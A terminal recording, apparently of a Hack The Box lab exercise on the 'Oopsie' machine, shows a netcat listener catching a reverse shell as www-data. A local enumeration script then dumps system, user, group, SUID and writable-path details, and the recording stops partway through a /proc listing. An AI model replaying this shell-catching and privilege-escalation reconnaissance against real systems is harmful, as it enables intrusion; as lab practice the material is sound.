@@ -1,0 +1,2035 @@
+Script started on 2024-10-24 06:39:03-04:00 [TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="126" LINES="29"]
+                                                                                                                              ]0;root@kali: ~/Desktop/HTB/Oopsie[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m~/Desktop/HTB/Oopsie[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[1mn[0m[1mn[0m[38;2;153;153;153mmap -T5 -sV 10.10.11.27 -oN nmap_scan.txt[39m[41D[0m[36mn[36mc[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [40D[38;2;153;153;153m -nlvp  1337[39m[12D[39m [32m-[32mn[32ml[32mv[32mp[39m[39m [39m [39m1[39m3[39m3[39m7 [38;2;153;153;153m7[39m [39m [38;2;153;153;153m37[39m [39m [39m [38;2;153;153;153m337[39m [39m [39m [39m [38;2;153;153;153m1337[39m[39m4[39m [39m [39m [38;2;153;153;153m444 [39m[39m4[39m4[39m4[39m [?1l>[?2004l
+listening on [any] 4444 ...
+connect to [10.10.15.90] from (UNKNOWN) [10.129.95.191] 51248
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:39:40 up  2:52,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1453): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@oopsie:/$ cd tmp 
+cd tmp 
+www-data@oopsie:/tmp$ cat   ks  ls
+ls
+enum.log
+linux-local-enum.sh
+www-data@oopsie:/tmp$ ./linn ux   x-local0 -enum
+./linux-local-enum
+bash: ./linux-local-enum: No such file or directory
+www-data@oopsie:/tmp$ ls  ./lun  o inux-local-0 enum.sh 
+./linux-local-enum.sh 
+tput: No value for $TERM and no -T specified
+tput: No value for $TERM and no -T specified
+tput: No value for $TERM and no -T specified
+tput: No value for $TERM and no -T specified
+tput: No value for $TERM and no -T specified
+tput: No value for $TERM and no -T specified
+                       .
+                        `:.
+                          `:.
+                  .:'     ,::
+                 .:'      ;:'
+                 ::      ;:'
+                  :    .:'
+                   `.  :.
+          _________________________
+         :                         :
+     ,---:      HighOn.Coffee      :
+    : ,'"`:                       :'
+    `.`.  `:                     :'
+      `.`-._:                   :
+        `-.__`.               ,' 
+    ,--------`"`-------------'--------.
+     `"--.__                   __.--"'
+            `""-------------""'
+
+URL:  http://highon.coffee  
+Version:  1.0  
+Twitter:  @HighOn_Coffee  
+Author:  @Arr0way  
+Disclaimer: 
+
+ HighOn.Coffee is not responsible for misuse or for any damage that you may cause! 
+
+ You agree that you use this software at your own risk.   
+
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Linux Version
+##
+tput: No value for $TERM and no -T specified
+
+
+Ubuntu 18.04.3 LTS \n \l
+
+
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.3 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Kernel Info
+##
+tput: No value for $TERM and no -T specified
+
+
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Network Info
+##
+tput: No value for $TERM and no -T specified
+
+
+/bin/cat: /etc/sysconfig/network: No such file or directory
+
+# This file is managed by man:systemd-resolved(8). Do not edit.
+#
+# This is a dynamic resolv.conf file for connecting local clients to the
+# internal DNS stub resolver of systemd-resolved. This file lists all
+# configured search domains.
+#
+# Run "systemd-resolve --status" to see details about the uplink DNS servers
+# currently in use.
+#
+# Third party programs must not access this file directly, but only through the
+# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,
+# replace this symlink by a static file or a different symlink.
+#
+# See man:systemd-resolved.service(8) for details about the supported modes of
+# operation for /etc/resolv.conf.
+
+nameserver 127.0.0.53
+options edns0
+
+/bin/cat: /etc/sysconfig/network-scripts/ifcfg-eth0: No such file or directory
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:94:93:73 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.95.191/16 brd 10.129.255.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:fe94:9373/64 scope global dynamic mngtmpaddr 
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:fe94:9373/64 scope link 
+       valid_lft forever preferred_lft forever
+
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.95.191  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:fe94:9373  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:fe94:9373  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:94:93:73  txqueuelen 1000  (Ethernet)
+        RX packets 21103  bytes 2017545 (2.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9410  bytes 4155772 (4.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 12112  bytes 954836 (954.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12112  bytes 954836 (954.8 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+tput: No value for $TERM and no -T specified
+
+##
+##  File System Info
+##
+tput: No value for $TERM and no -T specified
+
+
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda3       6.8G  2.8G  4.0G  41% /
+udev            1.9G     0  1.9G   0% /dev
+tmpfs           2.0G     0  2.0G   0% /dev/shm
+tmpfs           395M  1.2M  394M   1% /run
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
+/dev/loop1      100M  100M     0 100% /snap/core/11420
+/dev/loop0      100M  100M     0 100% /snap/core/11743
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Mounted File Systems with Pretty Output
+##
+tput: No value for $TERM and no -T specified
+
+
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda3       6.8G  2.8G  4.0G  41% /
+udev            1.9G     0  1.9G   0% /dev
+tmpfs           2.0G     0  2.0G   0% /dev/shm
+tmpfs           395M  1.2M  394M   1% /run
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
+/dev/loop1      100M  100M     0 100% /snap/core/11420
+/dev/loop0      100M  100M     0 100% /snap/core/11743
+/dev/sda3                             on  /                                type  ext4         (rw,relatime,data=ordered)
+udev                                  on  /dev                             type  devtmpfs     (rw,nosuid,relatime,size=1988432k,nr_inodes=497108,mode=755)
+devpts                                on  /dev/pts                         type  devpts       (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs                                 on  /dev/shm                         type  tmpfs        (rw,nosuid,nodev)
+mqueue                                on  /dev/mqueue                      type  mqueue       (rw,relatime)
+hugetlbfs                             on  /dev/hugepages                   type  hugetlbfs    (rw,relatime,pagesize=2M)
+tmpfs                                 on  /run                             type  tmpfs        (rw,nosuid,noexec,relatime,size=403972k,mode=755)
+tmpfs                                 on  /run/lock                        type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=5120k)
+sysfs                                 on  /sys                             type  sysfs        (rw,nosuid,nodev,noexec,relatime)
+securityfs                            on  /sys/kernel/security             type  securityfs   (rw,nosuid,nodev,noexec,relatime)
+tmpfs                                 on  /sys/fs/cgroup                   type  tmpfs        (ro,nosuid,nodev,noexec,mode=755)
+cgroup                                on  /sys/fs/cgroup/unified           type  cgroup2      (rw,nosuid,nodev,noexec,relatime)
+cgroup                                on  /sys/fs/cgroup/systemd           type  cgroup       (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+cgroup                                on  /sys/fs/cgroup/cpu,cpuacct       type  cgroup       (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup                                on  /sys/fs/cgroup/pids              type  cgroup       (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup                                on  /sys/fs/cgroup/cpuset            type  cgroup       (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup                                on  /sys/fs/cgroup/devices           type  cgroup       (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup                                on  /sys/fs/cgroup/rdma              type  cgroup       (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup                                on  /sys/fs/cgroup/freezer           type  cgroup       (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup                                on  /sys/fs/cgroup/net_cls,net_prio  type  cgroup       (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup                                on  /sys/fs/cgroup/perf_event        type  cgroup       (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup                                on  /sys/fs/cgroup/memory            type  cgroup       (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup                                on  /sys/fs/cgroup/hugetlb           type  cgroup       (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup                                on  /sys/fs/cgroup/blkio             type  cgroup       (rw,nosuid,nodev,noexec,relatime,blkio)
+pstore                                on  /sys/fs/pstore                   type  pstore       (rw,nosuid,nodev,noexec,relatime)
+debugfs                               on  /sys/kernel/debug                type  debugfs      (rw,relatime)
+fusectl                               on  /sys/fs/fuse/connections         type  fusectl      (rw,relatime)
+configfs                              on  /sys/kernel/config               type  configfs     (rw,relatime)
+proc                                  on  /proc                            type  proc         (rw,nosuid,nodev,noexec,relatime)
+systemd-1                             on  /proc/sys/fs/binfmt_misc         type  autofs       (rw,relatime,fd=38,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13234)
+/var/lib/snapd/snaps/core_11420.snap  on  /snap/core/11420                 type  squashfs     (ro,nodev,relatime,x-gdu.hide)
+/var/lib/snapd/snaps/core_11743.snap  on  /snap/core/11743                 type  squashfs     (ro,nodev,relatime,x-gdu.hide)
+/dev/sda3                             on  /tmp                             type  ext4         (rw,relatime,data=ordered)
+/dev/sda3                             on  /var/tmp                         type  ext4         (rw,relatime,data=ordered)
+lxcfs                                 on  /var/lib/lxcfs                   type  fuse.lxcfs   (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
+binfmt_misc                           on  /proc/sys/fs/binfmt_misc         type  binfmt_misc  (rw,relatime)
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /etc/fstab File Contents
+##
+tput: No value for $TERM and no -T specified
+
+
+UUID=b49fb162-bc9b-4c2e-9e3c-2ba5c6bae1a7 / ext4 defaults 0 0
+/dev/sda2	none	swap	sw	0	0
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /etc/passwd File Contents
+##
+tput: No value for $TERM and no -T specified
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /etc/passwd File Contents
+##
+tput: No value for $TERM and no -T specified
+
+
+/bin/cat: /etc/shadow: Permission denied
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /etc/group File Contents
+##
+tput: No value for $TERM and no -T specified
+
+
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+robert:x:1000:lxd
+ssl-cert:x:113:
+mysql:x:114:
+bugtracker:x:1001:robert
+netdev:x:115:
+
+tput: No value for $TERM and no -T specified
+
+##
+##  /etc/sudoers File Contents
+##
+tput: No value for $TERM and no -T specified
+
+
+/bin/cat: /etc/sudoers: Permission denied
+
+tput: No value for $TERM and no -T specified
+
+##
+##  root owned SUID Files
+##
+tput: No value for $TERM and no -T specified
+
+
+/snap/core/11420/bin/mount
+/snap/core/11420/bin/ping
+/snap/core/11420/bin/ping6
+/snap/core/11420/bin/su
+/snap/core/11420/bin/umount
+/snap/core/11420/usr/bin/chfn
+/snap/core/11420/usr/bin/chsh
+/snap/core/11420/usr/bin/gpasswd
+/snap/core/11420/usr/bin/newgrp
+/snap/core/11420/usr/bin/passwd
+/snap/core/11420/usr/bin/sudo
+/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11420/usr/lib/openssh/ssh-keysign
+/snap/core/11420/usr/lib/snapd/snap-confine
+/snap/core/11420/usr/sbin/pppd
+/snap/core/11743/bin/mount
+/snap/core/11743/bin/ping
+/snap/core/11743/bin/ping6
+/snap/core/11743/bin/su
+/snap/core/11743/bin/umount
+/snap/core/11743/usr/bin/chfn
+/snap/core/11743/usr/bin/chsh
+/snap/core/11743/usr/bin/gpasswd
+/snap/core/11743/usr/bin/newgrp
+/snap/core/11743/usr/bin/passwd
+/snap/core/11743/usr/bin/sudo
+/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11743/usr/lib/openssh/ssh-keysign
+/snap/core/11743/usr/lib/snapd/snap-confine
+/snap/core/11743/usr/sbin/pppd
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/su
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/bugtracker
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/sudo
+
+tput: No value for $TERM and no -T specified
+
+##
+##  root owned GUID Files
+##
+tput: No value for $TERM and no -T specified
+
+
+/usr/lib/snapd/snap-confine
+
+tput: No value for $TERM and no -T specified
+
+##
+##  World Writable Directories
+##
+tput: No value for $TERM and no -T specified
+
+
+/snap/core/11420/run/lock
+/snap/core/11420/tmp
+/snap/core/11420/var/tmp
+/snap/core/11743/run/lock
+/snap/core/11743/tmp
+/snap/core/11743/var/tmp
+/tmp
+/var/www/html/uploads
+/var/crash
+/var/tmp
+/var/lib/php/sessions
+/dev/mqueue
+/dev/shm
+/run/screen
+/run/lock
+tput: No value for $TERM and no -T specified
+
+##
+##  SUID Owned by any user
+##
+tput: No value for $TERM and no -T specified
+
+
+/snap/core/11420/etc/chatscripts
+/snap/core/11420/etc/ppp/peers
+/snap/core/11420/sbin/pam_extrausers_chkpwd
+/snap/core/11420/sbin/unix_chkpwd
+/snap/core/11420/usr/bin/chage
+/snap/core/11420/usr/bin/crontab
+/snap/core/11420/usr/bin/dotlockfile
+/snap/core/11420/usr/bin/expiry
+/snap/core/11420/usr/bin/mail-lock
+/snap/core/11420/usr/bin/mail-touchlock
+/snap/core/11420/usr/bin/mail-unlock
+/snap/core/11420/usr/bin/ssh-agent
+/snap/core/11420/usr/bin/wall
+/snap/core/11420/usr/local/lib/python3.5
+/snap/core/11420/usr/local/lib/python3.5/dist-packages
+/snap/core/11420/var/local
+/snap/core/11420/var/mail
+/snap/core/11743/etc/chatscripts
+/snap/core/11743/etc/ppp/peers
+/snap/core/11743/sbin/pam_extrausers_chkpwd
+/snap/core/11743/sbin/unix_chkpwd
+/snap/core/11743/usr/bin/chage
+/snap/core/11743/usr/bin/crontab
+/snap/core/11743/usr/bin/dotlockfile
+/snap/core/11743/usr/bin/expiry
+/snap/core/11743/usr/bin/mail-lock
+/snap/core/11743/usr/bin/mail-touchlock
+/snap/core/11743/usr/bin/mail-unlock
+/snap/core/11743/usr/bin/ssh-agent
+/snap/core/11743/usr/bin/wall
+/snap/core/11743/usr/local/lib/python3.5
+/snap/core/11743/usr/local/lib/python3.5/dist-packages
+/snap/core/11743/var/local
+/snap/core/11743/var/mail
+/var/log/journal
+/var/log/journal/30ac2a931f55413aac392af212029ea4
+/var/mail
+/var/local
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/usr/local/share/fonts
+/usr/local/lib/python3.6
+/usr/local/lib/python3.6/dist-packages
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/bsd-write
+/usr/bin/chage
+/usr/bin/expiry
+/usr/bin/wall
+/usr/bin/mlocate
+/usr/bin/crontab
+/usr/bin/ssh-agent
+tput: No value for $TERM and no -T specified
+
+##
+##  Files with no owner
+##
+tput: No value for $TERM and no -T specified
+
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Files with no group
+##
+tput: No value for $TERM and no -T specified
+
+
+
+tput: No value for $TERM and no -T specified
+
+##
+##  World Writable Files
+##
+tput: No value for $TERM and no -T specified
+
+
+/tmp/linux-local-enum.sh
+
+tput: No value for $TERM and no -T specified
+
+##
+##  Files Owned by Current User
+##
+tput: No value for $TERM and no -T specified
+
+
+/proc/1458
+/proc/1458/task
+/proc/1458/task/1458
+/proc/1458/task/1458/net
+/proc/1458/task/1458/attr
+/proc/1458/task/1458/attr/selinux
+/proc/1458/task/1458/attr/smack
+/proc/1458/task/1458/attr/apparmor
+/proc/1458/net
+/proc/1458/attr
+/proc/1458/attr/selinux
+/proc/1458/attr/smack
+/proc/1458/attr/apparmor
+/proc/1460
+/proc/1460/task
+/proc/1460/task/1460
+/proc/1460/task/1460/net
+/proc/1460/task/1460/attr
+/proc/1460/task/1460/attr/selinux
+/proc/1460/task/1460/attr/smack
+/proc/1460/task/1460/attr/apparmor
+/proc/1460/net
+/proc/1460/attr
+/proc/1460/attr/selinux
+/proc/1460/attr/smack
+/proc/1460/attr/apparmor
+/proc/1461
+/proc/1461/task
+/proc/1461/task/1461
+/proc/1461/task/1461/net
+/proc/1461/task/1461/attr
+/proc/1461/task/1461/attr/selinux
+/proc/1461/task/1461/attr/smack
+/proc/1461/task/1461/attr/apparmor
+/proc/1461/net
+/proc/1461/attr
+/proc/1461/attr/selinux
+/proc/1461/attr/smack
+/proc/1461/attr/apparmor
+/proc/1462
+/proc/1462/task
+/proc/1462/task/1462
+/proc/1462/task/1462/net
+/proc/1462/task/1462/attr
+/proc/1462/task/1462/attr/selinux
+/proc/1462/task/1462/attr/smack
+/proc/1462/task/1462/attr/apparmor
+/proc/1462/net
+/proc/1462/attr
+/proc/1462/attr/selinux
+/proc/1462/attr/smack
+/proc/1462/attr/apparmor
+/proc/1835
+/proc/1835/task
+/proc/1835/task/1835
+/proc/1835/task/1835/net
+/proc/1835/task/1835/attr
+/proc/1835/task/1835/attr/selinux
+/proc/1835/task/1835/attr/smack
+/proc/1835/task/1835/attr/apparmor
+/proc/1835/net
+/proc/1835/attr
+/proc/1835/attr/selinux
+/proc/1835/attr/smack
+/proc/1835/attr/apparmor
+/proc/1979
+/proc/1979/task
+/proc/1979/task/1979
+/proc/1979/task/1979/net
+/proc/1979/task/1979/attr
+/proc/1979/task/1979/attr/selinux
+/proc/1979/task/1979/attr/smack
+/proc/1979/task/1979/attr/apparmor
+/proc/1979/net
+/proc/1979/attr
+/proc/1979/attr/selinux
+/proc/1979/attr/smack
+/proc/1979/attr/apparmor
+/proc/1985
+/proc/1985/task
+/proc/1985/task/1985
+/proc/1985/task/1985/net
+/proc/1985/task/1985/attr
+/proc/1985/task/1985/attr/selinux
+/proc/1985/task/1985/attr/smack
+/proc/1985/task/1985/attr/apparmor
+/proc/1985/net
+/proc/1985/attr
+/proc/1985/attr/selinux
+/proc/1985/attr/smack
+/proc/1985/attr/apparmor
+/proc/1991
+/proc/1991/task
+/proc/1991/task/1991
+/proc/1991/task/1991/net
+/proc/1991/task/1991/attr
+/proc/1991/task/1991/attr/selinux
+/proc/1991/task/1991/attr/smack
+/proc/1991/task/1991/attr/apparmor
+/proc/1991/net
+/proc/1991/attr
+/proc/1991/attr/selinux
+/proc/1991/attr/smack
+/proc/1991/attr/apparmor
+/proc/1992
+/proc/1992/task
+/proc/1992/task/1992
+/proc/1992/task/1992/net
+/proc/1992/task/1992/attr
+/proc/1992/task/1992/attr/selinux
+/proc/1992/task/1992/attr/smack
+/proc/1992/task/1992/attr/apparmor
+/proc/1992/net
+/proc/1992/attr
+/proc/1992/attr/selinux
+/proc/1992/attr/smack
+/proc/1992/attr/apparmor
+/proc/1993
+/proc/1993/task
+/proc/1993/task/1993
+/proc/1993/task/1993/net
+/proc/1993/task/1993/attr
+/proc/1993/task/1993/attr/selinux
+/proc/1993/task/1993/attr/smack
+/proc/1993/task/1993/attr/apparmor
+/proc/1993/net
+/proc/1993/attr
+/proc/1993/attr/selinux
+/proc/1993/attr/smack
+/proc/1993/attr/apparmor
+/proc/2870
+/proc/2870/task
+/proc/2870/task/2870
+/proc/2870/task/2870/fd
+/proc/2870/task/2870/fd/0
+/proc/2870/task/2870/fd/1
+/proc/2870/task/2870/fd/2
+/proc/2870/task/2870/fd/12
+/proc/2870/task/2870/fdinfo
+/proc/2870/task/2870/fdinfo/0
+/proc/2870/task/2870/fdinfo/1
+/proc/2870/task/2870/fdinfo/2
+/proc/2870/task/2870/fdinfo/12
+/proc/2870/task/2870/ns
+/proc/2870/task/2870/ns/net
+/proc/2870/task/2870/ns/uts
+/proc/2870/task/2870/ns/ipc
+/proc/2870/task/2870/ns/pid
+/proc/2870/task/2870/ns/pid_for_children
+/proc/2870/task/2870/ns/user
+/proc/2870/task/2870/ns/mnt
+/proc/2870/task/2870/ns/cgroup
+/proc/2870/task/2870/net
+/proc/2870/task/2870/environ
+/proc/2870/task/2870/auxv
+/proc/2870/task/2870/status
+/proc/2870/task/2870/personality
+/proc/2870/task/2870/limits
+/proc/2870/task/2870/sched
+/proc/2870/task/2870/comm
+/proc/2870/task/2870/syscall
+/proc/2870/task/2870/cmdline
+/proc/2870/task/2870/stat
+/proc/2870/task/2870/statm
+/proc/2870/task/2870/maps
+/proc/2870/task/2870/children
+/proc/2870/task/2870/numa_maps
+/proc/2870/task/2870/mem
+/proc/2870/task/2870/cwd
+/proc/2870/task/2870/root
+/proc/2870/task/2870/exe
+/proc/2870/task/2870/mounts
+/proc/2870/task/2870/mountinfo
+/proc/2870/task/2870/clear_refs
+/proc/2870/task/2870/smaps
+/proc/2870/task/2870/smaps_rollup
+/proc/2870/task/2870/pagemap
+/proc/2870/task/2870/attr
+/proc/2870/task/2870/attr/current
+/proc/2870/task/2870/attr/prev
+/proc/2870/task/2870/attr/exec
+/proc/2870/task/2870/attr/fscreate
+/proc/2870/task/2870/attr/keycreate
+/proc/2870/task/2870/attr/sockcreate
+/proc/2870/task/2870/attr/display_lsm
+/proc/2870/task/2870/attr/selinux
+/proc/2870/task/2870/attr/selinux/current
+/proc/2870/task/2870/attr/selinux/prev
+/proc/2870/task/2870/attr/selinux/exec
+/proc/2870/task/2870/attr/selinux/fscreate
+/proc/2870/task/2870/attr/selinux/keycreate
+/proc/2870/task/2870/attr/selinux/sockcreate
+/proc/2870/task/2870/attr/smack
+/proc/2870/task/2870/attr/smack/current
+/proc/2870/task/2870/attr/apparmor
+/proc/2870/task/2870/attr/apparmor/current
+/proc/2870/task/2870/attr/apparmor/prev
+/proc/2870/task/2870/attr/apparmor/exec
+/proc/2870/task/2870/wchan
+/proc/2870/task/2870/stack
+/proc/2870/task/2870/schedstat
+/proc/2870/task/2870/cpuset
+/proc/2870/task/2870/cgroup
+/proc/2870/task/2870/oom_score
+/proc/2870/task/2870/oom_adj
+/proc/2870/task/2870/oom_score_adj
+/proc/2870/task/2870/loginuid
+/proc/2870/task/2870/sessionid
+/proc/2870/task/2870/io
+/proc/2870/task/2870/uid_map
+/proc/2870/task/2870/gid_map
+/proc/2870/task/2870/projid_map
+/proc/2870/task/2870/setgroups
+/proc/2870/task/2870/patch_state
+/proc/2870/fd
+/proc/2870/fd/0
+/proc/2870/fd/1
+/proc/2870/fd/2
+/proc/2870/fd/12
+/proc/2870/map_files
+/proc/2870/map_files/55bead82b000-55bead847000
+/proc/2870/map_files/55beada46000-55beada48000
+/proc/2870/map_files/55beada48000-55beada49000
+/proc/2870/map_files/7f0af52f0000-7f0af54d7000
+/proc/2870/map_files/7f0af54d7000-7f0af56d7000
+/proc/2870/map_files/7f0af56d7000-7f0af56db000
+/proc/2870/map_files/7f0af56db000-7f0af56dd000
+/proc/2870/map_files/7f0af56e1000-7f0af5708000
+/proc/2870/map_files/7f0af5908000-7f0af5909000
+/proc/2870/map_files/7f0af5909000-7f0af590a000
+/proc/2870/fdinfo
+/proc/2870/fdinfo/0
+/proc/2870/fdinfo/1
+/proc/2870/fdinfo/2
+/proc/2870/fdinfo/12
+/proc/2870/ns
+/proc/2870/ns/net
+/proc/2870/ns/uts
+/proc/2870/ns/ipc
+/proc/2870/ns/pid
+/proc/2870/ns/pid_for_children
+/proc/2870/ns/user
+/proc/2870/ns/mnt
+/proc/2870/ns/cgroup
+/proc/2870/net
+/proc/2870/environ
+/proc/2870/auxv
+/proc/2870/status
+/proc/2870/personality
+/proc/2870/limits
+/proc/2870/sched
+/proc/2870/autogroup
+/proc/2870/comm
+/proc/2870/syscall
+/proc/2870/cmdline
+/proc/2870/stat
+/proc/2870/statm
+/proc/2870/maps
+/proc/2870/numa_maps
+/proc/2870/mem
+/proc/2870/cwd
+/proc/2870/root
+/proc/2870/exe
+/proc/2870/mounts
+/proc/2870/mountinfo
+/proc/2870/mountstats
+/proc/2870/clear_refs
+/proc/2870/smaps
+/proc/2870/smaps_rollup
